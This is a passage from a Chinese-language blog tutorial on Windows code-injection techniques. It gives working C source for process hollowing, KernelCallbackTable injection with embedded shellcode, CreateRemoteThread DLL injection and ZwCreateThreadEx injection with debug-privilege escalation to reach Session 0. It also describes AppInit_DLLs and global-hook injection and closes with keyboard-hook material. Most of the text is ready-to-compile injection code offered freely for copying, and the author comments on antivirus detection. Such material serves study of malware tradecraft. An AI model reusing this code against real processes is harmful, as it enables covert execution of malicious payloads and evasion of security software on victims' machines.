pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);//用Imagebase为起始地址避免了重定位。 if (lpAddr == NULL) { printf(\"VirtualAlloc failed %d\\n\", GetLastError()); return 1; } //5.写入傀儡进程 // 替换PE头 // 这里在内存中开辟的40000的空间写入了被注入程序的所有的头，节区留着后面写 if (!WriteProcessMemory(pi.hProcess, lpAddr, (LPCVOID)pBuf, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL)) { printf(\"WriteProcessMemory error code : %d\\n\", GetLastError()); return 1; } // 替换节 // 将地址seek到节区头开始 DWORD nt_size = sizeof(IMAGE_NT_HEADERS); long long tmp = (pBuf + pDosHeader->e_lfanew); LPVOID lpSectionBaseAddr = (LPVOID)(tmp + nt_size); PIMAGE_SECTION_HEADER pSectionHeader; for (DWORD dwIndex = 0; dwIndex FileHeader.NumberOfSections; ++dwIndex) { pSectionHeader = (PIMAGE_SECTION_HEADER)lpSectionBaseAddr; // 句柄，要写入进程的地址，指向本程序的要往外写的内容的地址 LPVOID RemoteProcess_address = (LPVOID)((BYTE*)lpAddr + pSectionHeader->VirtualAddress); LPVOID LocalProcess_address = (LPCVOID)(pBuf + pSectionHeader->PointerToRawData); if (!WriteProcessMemory(pi.hProcess, RemoteProcess_address, LocalProcess_address, pSectionHeader->SizeOfRawData, NULL)) { printf(\"WriteProcessMemory error code : %d\\n\", GetLastError()); return 1; } lpSectionBaseAddr = (LPVOID)((BYTE*)lpSectionBaseAddr + sizeof(IMAGE_SECTION_HEADER)); } //6.恢复现场并运行傀儡进程 // 替换PEB中基地址 DWORD dwImageBase = pNtHeaders->OptionalHeader.ImageBase; // 另一种修改peb的方式 /* NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hNtdll, \"NtQueryInformationProcess\"); //find base addr by peb PROCESS_BASIC_INFORMATION pbi; ULONG ReturnLength; NTSTATUS status = NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), &ReturnLength); if (status != 0) { printf(\"NtQueryInformationProcess 失败，错误码 %lu\\n\", status); return 1; } // peb offset DWORD_PTR pef_offset = (DWORD_PTR)pbi.PebBaseAddress; // 修改peb结构体中的baseaddress的值 if (!WriteProcessMemory(pi.hProcess, (LPVOID)((BYTE*)pef_offset+0x10), (LPCVOID)&dwImageBase, sizeof(PVOID), NULL)) { printf(\"WriteProcessMemory error code : %d\\n\", GetLastError()); return 1; } */ // 另一种修改peb的方式 rdx保留了peb的baseaddr, 不要使用(LPCVOID)&dwImageBase，会造成高地址全是cc //WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL); if (!WriteProcessMemory(pi.hProcess, (LPVOID)((ctx.Rdx)+0x10), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL)) { printf(\"WriteProcessMemory error code : %d\\n\", GetLastError()); return 1; } // 替换入口点 64 -> rcx; 32 -> eax //ctx.Rcx = dwImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint; ctx.Rcx = (SIZE_T)((LPBYTE)pNtHeaders->OptionalHeader.ImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint); if (!SetThreadContext(pi.hThread, &ctx)) { printf(\"SetThreadContext failed : %d\\n\", GetLastError()); return 1; } //CreateRemoteThread(pi.hThread, 0, 0, (LPTHREAD_START_ROUTINE)(dwImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint), 0, 0, NULL); ResumeThread(pi.hThread); free(pBuf); return 0; } 思路简单，就是写起来比较麻烦，但是可以直接注入整个exe文件，比较方便，查杀率高的一逼 6、消息回调注入 通过修改PEB表中的特定消息回调函数的指针使其指向shellcode，然后再向该进程发送消息，触发shellcode执行。SendMessage函数来发送消息进行shellcode的触发。 先用windbg看一下PEB的结构， attach一个进程，然后 !peb # 定位到kct的地址 dps addr L100 # 查看kct的具体内容 老多内容了。 流程 找到目标进程句柄，找到peb地址，定位KernelCallBackTable表（kct表），然后申请内存空间写入shellcode 定位peb 定位kct 申请shellcode空间 创建新的kct 将新的kct的里面的某一个消息回调的地址进行设置为shellcode 更新kct 触发shellcode 实现代码 #include #include #include #include \"struct.h\" // https://github.com/capt-meelo/KernelCallbackTable-Injection/blob/master/KCT.cpp // http://hacky.ren/2022/04/23/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.4.16-4.22%EF%BC%89/ // 32bit unsigned char shellcode[] = \"\\xcc\\xc3\\x55\\x89\\xE5\\x33\\xC0\\x50\\xB8\\x2E\\x64\\x6C\\x6C\\x50\\xB8\\x65\\x6C\\x33\\x32\\x50\\xB8\\x6B\\x65\\x72\\x6E\\x50\\x8B\\xC4\\x50\\xB8\" \"\\xA0\\x12\\xed\\x76\" \"\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x2E\\x65\\x78\\x65\\x50\\xB8\\x63\\x61\\x6C\\x63\\x50\\x8B\\xC4\\x6A\\x05\\x50\\xB8\" \"\\xF0\\xE1\\xF0\\x76\" \"\\xFF\\xD0\\x33\\xC0\\x50\\xB8\" \"\\x80\\x59\\xed\\x76\" \"\\xFF\\xD0\\x90\\x90\\xC3\"; // 64bit unsigned char shellcode64[] = \"\\xcc\\xc3\\x55\\x48\\x8B\\xEC\\x90\\xC7\\x04\\x24\\x2E\\x64\\x6C\\x6C\\xC7\\x44\\x24\\xFC\\x65\\x6C\\x33\\x32\\xC7\\x44\\x24\\xF8\\x6B\\x65\\x72\\x6E\\x48\\x8B\\xCC\\x90\\x90\\x48\\xB8\" \"\\xA0\\x8C\\xC7\\xA7\\xFE\\x7F\\x00\\x00\" \"\\xFF\\xD0\\xBA\\x05\\x00\\x00\\x00\\xC7\\x04\\x24\\x65\\x78\\x65\\x2E\\xC7\\x44\\x24\\xFC\\x63\\x6C\\x61\\x63\\xC7\\x44\\x24\\xF8\\x00\\x00\\x00\\x00\\x48\\x8B\\xCC\\x90\\x48\\xB8\" \"\\xD0\\x77\\x41\\xA8\\xFE\\x7F\\x00\\x00\" \"\\x90\\x90\\x90\\xC3\"; /* typedef struct _PROCESS_BASIC_INFORMATION { PVOID Reserved1; PVOID PebBaseAddress; PVOID Reserved2[2]; ULONG_PTR UniqueProcessId; PVOID Reserved3; } PROCESS_BASIC_INFORMATION; */ typedef LONG(NTAPI* NtQueryInformationProcessPtr)( HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength ); int main() { STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 }; HWND hWnd = FindWindow(L\"Notepad\", NULL); DWORD processId; DWORD threadId = GetWindowThreadProcessId(hWnd, &processId); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId); //printf(\"[++] processId 0x%lp\\n[++] threadId 0x%lp\", processId, threadId); // NtQueryInformationProcess api在ntdll里，属于未公开的函数，所以需要动态调用 HMODULE hNtdll = LoadLibraryA(\"ntdll.dll\"); if (hNtdll == NULL) { printf(\"无法加载 ntdll.dll 库\\n\"); return 1; } NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hNtdll, \"NtQueryInformationProcess\"); //find base addr by peb PROCESS_BASIC_INFORMATION pbi; //ULONG ReturnLength; NTSTATUS status = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL); if (status != 0) { printf(\"NtQueryInformationProcess 失败，错误码 %lu\\n\", status); return 1; } // peb & kct address PEB peb; ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL); KERNELCALLBACKTABLE kct; ReadProcessMemory(hProcess, peb.KernelCallbackTable, &kct, sizeof(kct), NULL); //DWORD_PTR kct_addr = (DWORD_PTR)(BYTE*)peb_addr + 0x58; // 申请空间写入shellcode LPVOID payloadAddr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode64), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); WriteProcessMemory(hProcess, payloadAddr, shellcode64, sizeof(shellcode64), NULL); // 创建一个新的kct，因为之前的不能写 LPVOID newKCTAddr = VirtualAllocEx(hProcess, NULL, sizeof(kct), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); kct.__fnCOPYDATA = (ULONG_PTR)payloadAddr; WriteProcessMemory(hProcess, newKCTAddr, &kct, sizeof(kct), NULL); // 更新kct WriteProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &newKCTAddr, sizeof(ULONG_PTR), NULL); // 触发shellcode COPYDATASTRUCT cds; WCHAR msg[] = L\"Pwn\"; cds.dwData = 1; cds.cbData = lstrlen(msg) * 2; cds.lpData = msg; SendMessage(hWnd, WM_COPYDATA, (WPARAM)hWnd, (LPARAM)&cds); printf(\"[+] Payload executed\\n\"); return 0; } 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-10 21:08:36 "},"MyArticles/CyberSec/dll-inject.html":{"url":"MyArticles/CyberSec/dll-inject.html","title":"Dll注入的3.5种方式","keywords":"","body":"dll注入和进程注入都属于是代码注入的一种，但是直接注入dll相比于注入shellcode来说不用去关心api函数的调用和位置无关代码的定位。 环境：C、Gcc、Windows11 参考： 《逆向工程核心原理》 https://xz.aliyun.com/t/10318#toc-6 lll哥 编写dll dll注入需要先准备一个dll文件。这个可是比进程注入简单多了，简单太多了，再也不用为了写shellcode恶心了。 dll程序结构： DllMain dll程序可以存在DllMain函数，也可以只存在需要导出的函数。 但是在dll注入的时候，当dll被注入到目标进程之后，dllmain函数会被动执行，所以编写dll注入用的dll就一定需要dllmain。相同的，当执行LoadLibrary函数的时候，也会自动执行dllmain函数。 dllmain有一个固定的结构，注册了四个回调函数，用来表示四种不同的状态。 #include BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { switch (fdwReason) { // 将dll文件附加到进程（加载到地址空间时）。 case DLL_PROCESS_ATTACH: break; // 在进程中创建了新线程之后会执行。 case DLL_THREAD_ATTACH: break; // 进程中的线程退出时，执行的函数。 case DLL_THREAD_DETACH: break; // 当dll从进程空间脱离（退出）时执行的进程。 case DLL_PROCESS_DETACH: break; } return TRUE; } Export function 在前面声明一下函数的调用约定，利用dllexport关键字来说明这个函数是导出函数。 __declspec(dllexport) int __cdecl DownLoadFileFromUrl(int i) { if(i==1) { MessageBox(NULL, TEXT(\"start download file\"), TEXT(\"title 2\"), MB_OK); return RUN_SUCESS; } else if(i==2) { MessageBox(NULL, TEXT(\"stop download file\"), TEXT(\"title 2\"), MB_OK); return RUN_SUCESS; } } 可以这么写，也可以另外使用一个.h文件来说明。 测试代码 利用gcc命令进行编译，不要用dev，会出问题 gcc -o MessageboxDll.dll -shared MessageboxDll.c 在载入进程和脱离进程的时候都进行了函数调用， #include #include #include #define RUN_SUCESS 0 __declspec(dllexport) int __cdecl DownLoadFileFromUrl(int i) { if(i==1) { MessageBox(NULL, TEXT(\"start download file\"), TEXT(\"title 2\"), MB_OK); return RUN_SUCESS; } else if(i==2) { MessageBox(NULL, TEXT(\"stop download file\"), TEXT(\"title 2\"), MB_OK); return RUN_SUCESS; } } BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { switch (fdwReason) { // 将dll文件附加到进程（加载到地址空间时）。 case DLL_PROCESS_ATTACH: DownLoadFileFromUrl(1); break; // 在进程中创建了新线程之后会执行。 case DLL_THREAD_ATTACH: break; // 进程中的线程退出时，执行的函数。 case DLL_THREAD_DETACH: break; // 当dll从进程空间脱离（退出）时执行的进程。 case DLL_PROCESS_DETACH: DownLoadFileFromUrl(2); break; } return TRUE; } 注入dll 注入进程拥有目标进程内存的访问权限。注入dll主要有以下三种方法： 创建远程线程 使用注册表 消息HOOK APC注入 1、创建远程线程 利用CreateRemoteThreadAPI进行dll注入，这个API也是在进程注入中常用的API。 思路 将要注入的dll的路径写入被注入进程的地址。 通过CreateRemoteThreadapi利用Loadlibraryapi远程执行，载入dll。 结束 实现代码 下列的代码并不能成功注入dll程序，dll程序是可以正常执行的。但是writeprocessmemory这个api是可以正常执行的。 字符串也能写进去，然后参数传递也正常，通过断点发现调用loadlibrary函数也正常 #include #include #include #define notePID 1924 //char* dllpath = \"C:\\\\Users\\\\rootkit\\\\Desktop\\\\dll注入\\\\MessageboxDll.dll\"; char* dllpath = \"C:\\\\Users\\\\rootkit\\\\Desktop\\\\32_MessageboxDll.dll\"; int main() { size_t dwsize = (strlen(dllpath) + 1); //* sizeof(TCHAR); // 获取目标进程的句柄，采用打开现有进程的形式 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, notePID); // 在目标进程中开辟内存空间，用来存放注入的dll的地址 LPVOID pRemotebuf= VirtualAllocEx(hProcess, NULL, dwsize, MEM_COMMIT, PAGE_READWRITE); printf(\"[+] VirtualAlloc sucess addr = %p\\n\", pRemotebuf); // 向开辟出来的地址写入dll路径 WriteProcessMemory(hProcess, pRemotebuf, (LPCVOID)dllpath, dwsize, NULL); printf(\"[+] WriteProcessMemory sucess write dll path to target memroy \\n\"); /* * 获取loadlibrary的地址。两种方法 * 1、直接在本程序获得（在Windows中共享库的地址是一定的） * 2、利用PEB计算目标程序的kerneldll地址，复杂但是适合远程 */ //HMODULE hMOD = GetModuleHandle(L\"kernel32.dll\"); HMODULE hMOD = GetModuleHandle(L\"kernelbase.dll\"); FARPROC pThreadProc = GetProcAddress(hMOD, \"LoadLibraryW\"); printf(\"[+] GetProcAddress sucess pthreadproc = %p\\n\", pThreadProc); // 执行dll HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pThreadProc, pRemotebuf, 0, NULL); printf(\"[+] CreateRemoteThread sucess \\n\"); // 等待信号,创建线程并等待线程函数结束，这里WaitForSingleObject的第二个参数要设置为-1才能够一直等待 // 等着远程执行完dll之后才退出。但是实际发现意义不大 //WaitForSingleObject(hProcess, INFINITE); // 关闭句柄 CloseHandle(hProcess); CloseHandle(hThread); return 0; } 解决办法：感谢lll哥的支持。 注意loadlibrary的参数模式和参数的形式，char还是unicode 主要dll的绝对路径，不能用中文，同目录也要用绝对路径 能用的代码 #include #include #include #include /* * 注意loadlibrary的参数模式和参数的形式，char还是unicode * 主要dll的绝对路径，不能用中文，同目录也要用绝对路径 */ #define notePID 30028 //char* dllpath = \"C:\\\\Users\\\\rootkit\\\\Desktop\\\\dll注入\\\\MessageboxDll.dll\"; //char* dllpath = \"C:\\\\Users\\\\rootkit\\\\Desktop\\\\32_MessageboxDll.dll\"; //char* dllpath = \"messageboxDll.dll\"; LPCWSTR dllpath = L\"C:\\\\Users\\\\rootkit\\\\Desktop\\\\messageboxDll.dll\"; int main() { size_t dwsize = (_tcslen(dllpath) + 1) * sizeof(TCHAR); //size_t dwsize = (strlen(dllpath) + 1); //* sizeof(TCHAR); // 获取目标进程的句柄，采用打开现有进程的形式 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, notePID); // 在目标进程中开辟内存空间，用来存放注入的dll的地址 LPVOID pRemotebuf= VirtualAllocEx(hProcess, NULL, dwsize, MEM_COMMIT, PAGE_READWRITE); printf(\"[+] VirtualAlloc sucess addr = %p\\n\", pRemotebuf); // 向开辟出来的地址写入dll路径 WriteProcessMemory(hProcess, pRemotebuf, dllpath, dwsize, NULL); printf(\"[+] WriteProcessMemory sucess write dll path to target memroy \\n\"); /* * 获取loadlibrary的地址。两种方法 * 1、直接在本程序获得（在Windows中共享库的地址是一定的） * 2、利用PEB计算目标程序的kerneldll地址，复杂但是适合远程 */ HMODULE hMOD = GetModuleHandle(L\"kernelbase.dll\"); //HMODULE hMOD = GetModuleHandle(L\"kernelbase.dll\"); LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMOD, \"LoadLibraryW\"); printf(\"[+] GetProcAddress sucess pthreadproc = %p\\n\", pThreadProc); // 执行dll HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemotebuf, 0, NULL); printf(\"[+] CreateRemoteThread sucess \\n\"); // 等待信号,创建线程并等待线程函数结束，这里WaitForSingleObject的第二个参数要设置为-1才能够一直等待 WaitForSingleObject(hProcess, INFINITE); printf(\"%d\\n\", GetLastError()); // 关闭句柄 CloseHandle(hProcess); CloseHandle(hThread); return 0; } 检查方式 通过观察dll的显著特征。 利用调试器观察。 通过pe explore的shift+ctrl+f的功能来搜索dll程序，查看是否被注入。 1.5、突破 session 0 隔离 session 0隔离 历史 在Windows XP、Windows Server 2003，以及更老版本的Windows操作系统中，服务和应用程序使用相同的会话（Session）运行，而这个会话是由第一个登录到控制台的用户启动的。该会话就叫做Session 0。 从Windows Vista开始，只有服务可以托管到Session 0中，用户应用程序和服务之间会被隔离，并被要求运行在用户登录到系统时创建的后续会话中。例如第一个登录的用户创建 Session 1，第二个登录的用户创建Session 2，以此类推。 为了避免应用程序权限混乱造成的风险，微软提供了SESSION 0 隔离机制。 类似于奥特曼里的宇宙，session 0就是有M78星云的宇宙，赛罗飞出来看到的其他宇宙就是session1- n这些。 这里要实现的就是从其他session中，将dll注入到session 0中。 原理方法 由于SESSION 0隔离机制在内核6.0之后（vista、7、8...）,当创建一个线程后，并不会立即运行，通过先挂起进程，查看要运行的进程所在会话层之后再决定是否恢复进程运行，直接使用CreateRemoteThread无法实现【CreateSuspended的默认参数值为1导致线程无法恢复运行，导致DLL注入失败。】 突破 直接调用ZwCreateThreadEx，并在程序运行指定CreateSuspended为0即可实现远程线程注入DLL突破SESSION 0隔离。 关键API ZwCreateThreadEx 这个api没有公布，所以介绍不多。在 ntdll.dll 中并没有声明，所以我们需要使用 GetProcAddress从 ntdll.dll中获取该函数的导出地址。 // 64bit的情况下 DWORD WINAPI ZwCreateThreadEx( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown); // 32bit的情况下 DWORD WINAPI ZwCreateThreadEx( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown); 突破到session 0，还需要提高权限到system权限。 OpenProcessToken 打开与进程关联的访问令牌。 BOOL OpenProcessToken( __in HANDLE ProcessHandle, //要修改访问权限的进程句柄 __in DWORD DesiredAccess, //指定你要进行的操作类型 __out PHANDLE TokenHandle //返回的访问令牌指针 ); 如果该函数成功，则返回值为非零值。 LookupPrivilegeValueA 检索指定系统上用于本地表示指定特权名称的 LUID (LUID) 本地唯一标识符。 BOOL LookupPrivilegeValueA( LPCSTR lpSystemName, //要查看的系统，本地系统直接用NULL LPCSTR lpName, //指向一个以零结尾的字符串，指定特权的名称 PLUID lpLuid //用来接收所返回的制定特权名称的信息 ); 如果函数成功，该函数将返回非零。 AdjustTokenPrivileges 启用或禁用指定访问令牌中的特权。 在访问令牌中启用或禁用特权需要TOKEN_ADJUST_PRIVILEGES访问权限。 BOOL AdjustTokenPrivileges( HANDLE TokenHandle, //包含特权的句柄 BOOL DisableAllPrivileges, //禁用所有权限标志 PTOKEN_PRIVILEGES NewState, //新特权信息的指针(结构体) DWORD BufferLength, //缓冲数据大小,以字节为单位的PreviousState的缓存区(sizeof) PTOKEN_PRIVILEGES PreviousState,//接收被改变特权当前状态的Buffer PDWORD ReturnLength //接收PreviousState缓存区要求的大小 ); 实现流程 对自己进程进行提权，提权是为了执行特权指令 OpenProcess 打开要注入的进程获取进程句柄 VirtualAllocEx 在被注入的进程中申请读写内存 WriteProcessMemory 写入DLL路径到申请的内存中 获取ZtCreateThreadEx地址 提权 因为目标进程要执行高权限的一些存放在dll中的一些函数功能，所以需要先对目标进程进行提权操作。 1、OpenProcessToken 2、LookupPrivilegeValue 3、AdjustTokenPrivileges 所谓提权的本质还是利用AdjustTokenPrivilegesapi将禁用的权限重新启用。 #include #include #include BOOL EnableDebugPrivilege() { HANDLE hToken; BOOL fOk = FALSE; if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) { TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid); tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL); fOk = (GetLastError() == ERROR_SUCCESS); CloseHandle(hToken); } return fOk; } 然后利用提到的API进行系统服务级别的dll的注入 #include #include #include #ifdef _WIN64 typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown); #else typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown); #endif #define notePID 23472 LPCWSTR pszDllFileName = L\"C:\\\\Users\\\\rootkit\\\\Desktop\\\\messageboxDll.dll\"; BOOL EnableDebugPrivilege() { HANDLE hToken; BOOL fOk = FALSE; // 利用 TOKEN_ADJUST_PRIVILEGES ，这时启用或禁用特权所必需的，函数返回时标识新打开的访问令牌的句柄的指针hToken if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) { // 包含有关访问令牌的一组特权的信息的结构体 TOKEN_PRIVILEGES tp; // Privileges 数组中的条目数 tp.PrivilegeCount = 1; // 在本地系统上查找特权名称 LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid); // tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; // 启用或禁用指定访问令牌中的特权 fOk = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL); CloseHandle(hToken); } return fOk; } int main() { HANDLE hProcess = NULL; SIZE_T dwSize = 0; LPVOID pDllAddr = NULL; FARPROC pFuncProcAddr = NULL; HANDLE hRemoteThread = NULL; DWORD dwStatus = 0; if (!EnableDebugPrivilege()) { printf(\"modify the promession failed\\n\"); return 0; } // 打开注入进程，获取进程句柄 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, notePID); if (hProcess == NULL) { printf(\"OpenProcess Error! %d\\n\", GetLastError()); return 3; } // 在注入的进程申请内存地址 dwSize = lstrlen(pszDllFileName) + 1; pDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE); if (NULL == pDllAddr) { printf(\"VirualAlloc failed %d\\n\", GetLastError()); return 3; } //写入内存地址 if (WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize, NULL)) { printf(\"WriteProcessMemory failed %d\", GetLastError()); return 3; } //加载ntdll HMODULE hNtdllDll = LoadLibraryA(\"ntdll.dll\"); if (NULL == hNtdllDll) { printf(\"loadlibrary failed %d\\n\", GetLastError()); return 3; } // 获取LoadLibraryA函数地址 pFuncProcAddr = GetProcAddress(GetModuleHandleA(\"Kernelbase.dll\"), \"LoadLibraryW\"); if (pFuncProcAddr) { printf(\"find loadlibrary addr failed %d\\n\", GetLastError()); return 3; } //获取ZwCreateThreadEx函数地址 typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdllDll, \"ZwCreateThreadEx\"); if (ZwCreateThreadEx) { printf(\"get ZwCreateThread failed %d\\n\", GetLastError()); return 3; } // 使用 ZwCreateThreadEx 创建远线程, 实现 DLL 注入 dwStatus = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, 0, 0, 0, NULL); if (ZwCreateThreadEx) { printf(\"call ZwCreateThread failed %d\\n\", GetLastError()); return 3; } // 关闭句柄 CloseHandle(hProcess); FreeLibrary(hNtdllDll); printf(\"Inject Dll OK!\\n\\n\"); return 0; } 2、修改注册表 利用 AppInit_DLLs 技术通过修改加载顺序来达到注入的目的，这个修改是全局的，可能会导致系统无法正常启动，可以作为一个恶意病毒传播。 原理 User32.dll被加载到进程的时候，会读取存放在AppInit_DLLs，如果里面有值的话，就调用loadlibrary加载用户dll，所以这里存放的dll并不会加载到所有进程，只会加载到User32.dll的进程中去。 3、SetWindowsHookEx 原理 该方法的核心原理是依赖于这个api进行的，其他的没有什么技术。 常见Windows系统是基于消息机制的，通过每一个GUI线程都会维护一个线程消息队列。通过识别消息队列中的不同的消息来达到实现不同功能的目的。 根据上述原理，windows通过钩子机制来截获和监视系统中的这些消息，同样的我们也可以利用hook去实现自己的目的。 Hook分为全局和局部，全局一般用来实现dll注入(因为每一个进程的地址都是独立的，如果不将hook函数作为一个独立的地址，那么执行起来将非常麻烦)，局部hook就是针对某一个线程进行hook。 HHOOK WINAPI SetWindowsHookEx( __in int idHook, \\\\钩子类型 __in HOOKPROC lpfn, \\\\回调函数地址 __in HINSTANCE hMod, \\\\实例句柄 __in DWORD dwThreadId); \\\\线程ID，设置为0则为全局钩子，会影响所有的进程 使用这个api之后，当任意进程中生成指定的消息的时候，os就会把这个dll载进去，然后调用hook，这都是os自动进行的。 钩子类型：idHooK 值 含义 WH_CALLWNDPROC 4 安装一个挂钩过程，用于监视系统将消息发送到目标窗口过程之前的消息。 有关详细信息，请参阅 CallWndProc) 挂钩过程。 WH_CALLWNDPROCRET 12 安装一个挂钩过程，用于在目标窗口过程处理消息后监视消息。 有关详细信息，请参阅 CallWndRetProc 挂钩过程。 WH_CBT 5 安装一个挂钩过程，用于接收对 CBT 应用程序有用的通知。 有关详细信息，请参阅 CBTProc) 挂钩过程。 WH_DEBUG 9 安装一个挂钩过程，用于调试其他挂钩过程。 有关详细信息，请参阅 DebugProc) 挂钩过程。 WH_FOREGROUNDIDLE 11 安装将在应用程序前台线程即将处于空闲状态时调用的挂钩过程。 此挂钩可用于在空闲时间执行低优先级任务。 有关详细信息，请参阅 ForegroundIdleProc) 挂钩过程。 WH_GETMESSAGE 3 安装一个挂钩过程，用于监视发布到消息队列的消息。 有关详细信息，请参阅 GetMsgProc) 挂钩过程。 WH_JOURNALPLAYBACK 1 警告从Windows 11开始，不支持日记挂钩 API，将在将来的版本中删除。 因此，我们强烈建议改为调用 SendInput TextInput API。安装一个挂钩过程，用于发布以前由 WH_JOURNALRECORD 挂钩过程记录的消息。 有关详细信息，请参阅 JournalPlaybackProc) 挂钩过程。 WH_JOURNALRECORD 0 警告从Windows 11开始，不支持日记挂钩 API，将在将来的版本中删除。 因此，我们强烈建议改为调用 SendInput TextInput API。安装一个挂钩过程，用于记录发布到系统消息队列的输入消息。 此挂钩可用于录制宏。 有关详细信息，请参阅 JournalRecordProc) 挂钩过程。 WH_KEYBOARD 2 安装监视击键消息的挂钩过程。 有关详细信息，请参阅 KeyboardProc) 挂钩过程。 WH_KEYBOARD_LL 13 安装用于监视低级别键盘输入事件的挂钩过程。 有关详细信息，请参阅 LowLevelKeyboardProc) 挂钩过程。 WH_MOUSE 7 安装监视鼠标消息的挂钩过程。 有关详细信息，请参阅 MouseProc) 挂钩过程。 WH_MOUSE_LL 14 安装用于监视低级别鼠标输入事件的挂钩过程。 有关详细信息，请参阅 LowLevelMouseProc) 挂钩过程。 WH_MSGFILTER -1 安装一个挂钩过程，用于监视在对话框、消息框、菜单或滚动条中由输入事件生成的消息。 有关详细信息，请参阅 MessageProc) 挂钩过程。 WH_SHELL 10 安装一个挂钩过程，用于接收对 shell 应用程序有用的通知。 有关详细信息，请参阅 ShellProc) 挂钩过程。 WH_SYSMSGFILTER 6 安装一个挂钩过程，用于监视在对话框、消息框、菜单或滚动条中由输入事件生成的消息。 挂钩过程监视与调用线程位于同一桌面中的所有应用程序的消息。 有关详细信息，请参阅 SysMsgProc) 挂钩过程。 HOOKPORC 指向挂钩过程的指针。 如果 dwThreadId 参数为零或指定由其他进程创建的线程的标识符， 则 lpfn 参数必须指向 DLL 中的挂钩过程。 否则， lpfn 可以指向与当前进程关联的代码中的挂钩过程。 HINSTANCE 包含 lpfn 参数指向的挂钩过程的 DLL 的句柄。 如果 dwThreadId 参数指定由当前进程创建的线程，并且挂钩过程位于与当前进程关联的代码中，则必须将 hMod 参数设置为 NULL。 返回值 类型： HHOOK 如果函数成功，则返回值是挂钩过程的句柄；如果函数失败，则返回值为 NULL。 要获得更多的错误信息，请调用 GetLastError。 KeyboardProc函数 这是 键盘钩子的处理函数，这个函数是可以进行重命名的，但是参数不能变，使用这个函数的前提是SetWindowsHookEx函数的第一个参数必须是WH_KEYBOARD，才能使用。相当于一个配套设施了。 LRESULT CALLBACK KeyboardProc( _In_ int code, _In_ WPARAM wParam, 